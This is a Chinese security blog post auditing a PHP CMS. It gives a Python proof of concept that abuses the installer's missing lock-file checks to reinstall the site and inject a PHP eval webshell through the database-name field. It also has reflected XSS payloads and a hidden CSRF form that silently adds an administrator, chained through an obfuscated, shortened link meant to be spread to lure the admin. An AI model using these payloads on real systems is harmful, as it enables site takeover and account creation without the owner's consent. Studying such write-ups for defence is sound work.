\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnpanda.net\](https://www.cnpanda.net/codeaudit/104.html)

和其他 CMS 没有什么两样，都是通过 lock 文件来判定是否安装过 CMS，只不过这里出现问题的是，对于 lock 文件的判定不是全局，而是仅仅在 step1 进行了判定，攻击者可以直接 POST 请求 step2、step3 来进行重装。分析如下：  
**Install/Index.php** 文件：

```
$submit = isset($\_POST\['submit'\]) ? true : false;
$step = isset($\_POST\['step'\]) ? $\_POST\['step'\] : 1;
……
switch($step) {
    case '1':
        include 'step\_'.$step.'.php';
    break;
    case '2':
        $pass = true;
        $PHP\_VERSION = PHP\_VERSION;
        if(version\_compare($PHP\_VERSION, '4.3.0', '<')) {
            $php\_pass = $pass = false;
        } else {
            $php\_pass = true;
        }
        $PHP\_MYSQL = '';
        if(extension\_loaded('mysql')) {
            $PHP\_MYSQL = '支持';
            $mysql\_pass = true;
        } else {
            $PHP\_MYSQL = '不支持';
            $mysql\_pass = $pass = false;
        }
        $PHP\_GD = '';
        if(function\_exists('imagejpeg')) $PHP\_GD .= 'jpg';
        if(function\_exists('imagegif')) $PHP\_GD .= ' gif';
        if(function\_exists('imagepng')) $PHP\_GD .= ' png';
        if($PHP\_GD) {
            $gd\_pass = true;
        } else {
            $gd\_pass = false;
        }
        $PHP\_URL = @get\_cfg\_var("allow\_url\_fopen");
        $url\_pass = $PHP\_URL ? true : false;
        include 'step\_'.$step.'.php';
    break;
    case '3':
        include 'step\_'.$step.'.php';
    break;
    case '4':
        include 'step\_'.$step.'.php';
    break;
    case '5':
        function dexit($msg) {
            echo '<script>alert("'.$msg.'");window.history.back();</script>';
            exit;
        }
        
        if(!mysql\_connect($db\_host, $db\_user, $db\_pass)) dexit('无法连接到数据库服务器，请检查配置');
        $db\_name or dexit('请填写数据库名');
        if(!mysql\_select\_db($db\_name)) {
            if(!mysql\_query("CREATE DATABASE $db\_name")) dexit('指定的数据库不存在\\n\\n系统尝试创建失败，请通过其他方式建立数据库');
        }
        
        
        $fp="../inc/config.php";
        $f = fopen($fp,'r');
        $str = fread($f,filesize($fp));
        fclose($f);
        $str=str\_replace("define('sqlhost','".sqlhost."')","define('sqlhost','$db\_host')",$str) ;
        $str=str\_replace("define('sqldb','".sqldb."')","define('sqldb','$db\_name')",$str) ;
        $str=str\_replace("define('sqluser','".sqluser."')","define('sqluser','$db\_user')",$str) ;
        $str=str\_replace("define('sqlpwd','".sqlpwd."')","define('sqlpwd','$db\_pass')",$str) ;
        $str=str\_replace("define('siteurl','".siteurl."')","define('siteurl','$url')",$str) ;
        $str=str\_replace("define('logourl','".logourl."')","define('logourl','$url/image/logo.png')",$str) ;
        $f=fopen($fp,"w+");
        fputs($f,$str);
        fclose($f);
        
        include 'step\_'.$step.'.php';
        break;
    case '6':
        include 'step\_'.$step.'.php';
    break;
}

```

```
文件首先判断是否存在以POST提交的参数step，如果存在，那么进入安装的流程。由于默认为1，所以基本上只要打开install/index.php界面就是这个界面：


```

![](https://www.cnpanda.net/usr/uploads/2017/12/3686005907.png)

```
先看看step\_1.php：

```

![](https://www.cnpanda.net/usr/uploads/2017/12/4215306728.png)  
存在判断。可是 step\_2、step\_3、step\_4 均不存在：  
![](https://www.cnpanda.net/usr/uploads/2017/12/1792468651.png)  
![](https://www.cnpanda.net/usr/uploads/2017/12/2500329089.png)  
![](https://www.cnpanda.net/usr/uploads/2017/12/1621972342.png)  
这也就造成了重装漏洞。  
直接访问：  
![](https://www.cnpanda.net/usr/uploads/2017/12/3899745467.png)  
然后点击下一步即可。最后会进入数据库链接界面：

![](https://www.cnpanda.net/usr/uploads/2017/12/1333060079.png)

这里需要注意的是，从 step\_3 到 step\_4 会自动生成一个 token：

```
Step\_3.php：
if(@$step==3){
$token = md5(uniqid(rand(), true));    
$\_SESSION\['token'\]= $token;


```

所以如果直接提交安装的参数会不能安装，因此需要按照步骤来进行重装。  
到这里如果知道数据库密码，那么重装不是问题了，一般重装都是可以直接拿 shell 的，看了下配置文件，果然：

![](https://www.cnpanda.net/usr/uploads/2017/12/1204375009.png)

而在创建数据库名的时候，这套 CMS 也是没有进行过滤的：

![](https://www.cnpanda.net/usr/uploads/2017/12/2469490187.png)

因此可以创建数据库名为

> cpanda;-- -');eval($\_POST\[123\]);//'

的 payload，直接写入一句话。

![](https://www.cnpanda.net/usr/uploads/2017/12/1715607732.png)

查看配置文件 inc/config.php

![](https://www.cnpanda.net/usr/uploads/2017/12/3423055566.png)  
已经成功插入一句话。所以直接连接就可以。也可以连接 install/index.php 因为这个文件是引用了 config.php 的。

![](https://www.cnpanda.net/usr/uploads/2017/12/3985679965.png)

所以综上，利用 POC 如下：

```
import requests
import cgi
from bs4 import BeautifulSoup

s = requests.Session()
url\_1 = 'http://127.0.0.1/install/index.php'
def get\_token(url\_1):
    data = {"step":"3"}
    request = s.post(url\_1,data=data)
    html = request.content
    soup = BeautifulSoup(html)
    token = soup.find('input', {'name': 'token'})\["value"\]
    return token
data\_1 = {"step":"5","token":get\_token(url\_1),"db\_host":"localhost","db\_user":"root","db\_pass":"root","db\_name":"panda;-- -');eval($\_POST\[123\]);//'","url":"http://localhost/","admin":"admin","adminpwd":"admin888","adminpwd2":"admin888"}
getResult = s.post(url\_1,data=data\_1)
print getResult.text
print "\\nOK!The CMS had reset!"
 

```

![](https://www.cnpanda.net/usr/uploads/2017/12/1897634037.png)

审计的时候发现了一处 XSS：  
![](https://www.cnpanda.net/usr/uploads/2017/12/3002881709.png)

```
<input <?php echo @$\_GET\['noshuiyin'\]?>" />
<input <?php echo @$\_GET\['imgid'\]?>" />


```

隐藏字段 noshuiyin 和 imgid，直接提交相应的参数就可以执行 XSS，只不过这里遇到的小问题是，这套源码把单引号双引号给转义了：  
![](https://www.cnpanda.net/usr/uploads/2017/12/345717615.png)  
这种过滤没什么用，绕过的方法太多，这里提供几个 payload：

> [http://localhost/uploadimg\_form.php?noshuiyin](http://localhost/uploadimg_form.php?noshuiyin)\="/><img src=0  
> onerror=alert(1)>  
> [http://localhost/uploadimg\_form.php?noshuiyin](http://localhost/uploadimg_form.php?noshuiyin)\="/><script>alert(1);</script>  
> [http://localhost/uploadimg\_form.php?noshuiyin](http://localhost/uploadimg_form.php?noshuiyin)\="/><script>alert(/xss/)</script>  
> [http://localhost/uploadimg\_form.php?noshuiyin](http://localhost/uploadimg_form.php?noshuiyin)\="/><input  
> onfocus=alert(1) autofocus>  
> [http://localhost/uploadimg\_form.php?noshuiyin](http://localhost/uploadimg_form.php?noshuiyin)\="/><iframe/onload=alert(/xss/)>  
> [http://localhost/uploadimg\_form.php?noshuiyin](http://localhost/uploadimg_form.php?noshuiyin)\="/><p  
> onmouseover=alert(/xss/)>xss xss</p>

反射型的 XSS 一般危险性是低，但一旦它和 SCRF 结合，就会产生美妙的效果：  
先到后台试一试添加管理员，尝试抓包：  
![](https://www.cnpanda.net/usr/uploads/2017/12/2225493960.png)  
果然是没有 Token 的，那么就简单了，直接构造 payload：

```
你好！再见！

<form method="POST" action="http://127.0.0.1/admin/adminadd.php?action=add" target="hidden\_frame">
<input type="hidden"  />
<input type="hidden"  />
<input type="hidden"  />
</form>
<iframe style="DISPLAY: none" id=hidden\_frame name=hidden\_frame></iframe>
<script>document.forms\[0\].submit();</script>


```

效果如下：  
![](https://www.cnpanda.net/usr/uploads/2017/12/3466541131.png)  
不会跳转到添加管理员成功后界面，但实际上管理员已经添加上了：  
![](https://www.cnpanda.net/usr/uploads/2017/12/1141358958.png)  
可以说神不知鬼不觉的创建了一个管理员。当然，需要有前提的，这个前提是管理员已经登录的情况下才不会跳转，如果没有登录依旧会跳转的：  
![](https://www.cnpanda.net/usr/uploads/2017/12/2882988211.png)  
所以到这里，我们将 XSS 和 CSRF 相结合，效果就出来了，效果如下：  
Payload：

> [http://localhost/](http://localhost/)  
> uploadimg\_form.php?noshuiyin="/><script>location.href=`http://localhost/test.html`</script>

这里有个 Tips，因为前文说了，过滤了单双引号，而想要跳转链接就避免不了的使用单双引号，后来请求师傅们帮助，得到了解决方法。使用 \` 代替单双引号即可！  
在加密混淆一下：

> [http://127.0.0.1/](http://127.0.0.1/)  
> uploadimg\_form.php?noshuiyin=%22%2f%3e%3c%73%63%72%69%70%74%3e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%3d%60%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%74%65%73%74%2e%68%74%6d%6c%60%3c%2f%73%63%72%69%70%74%3e

或者短连接：  
![](https://www.cnpanda.net/usr/uploads/2017/12/1002219980.png)

![](https://www.cnpanda.net/usr/uploads/2017/12/3820671327.png)  
或者最后再来一个分享到微博：  
![](https://www.cnpanda.net/usr/uploads/2017/12/918820226.png)  
这个链接美滋滋~~  
可能有人问为何要将这个链接给加密而不直接给自己搭建的钓鱼地址加密，原因就在于 referer 验证了，有的 CSRF 没有 token 的限制但是还有 Referer 的限制，不过这个 CMS 是没有 Referer 限制的，直接在自己的服务器上搭建那个 payload 让管理员访问就可以了，这里只是提供一个如果有 referer 验证应该如何绕的例子。

使用微信扫描二维码完成支付

![](https://www.cnpanda.net/usr/themes/sec/img/alipay-2.jpg)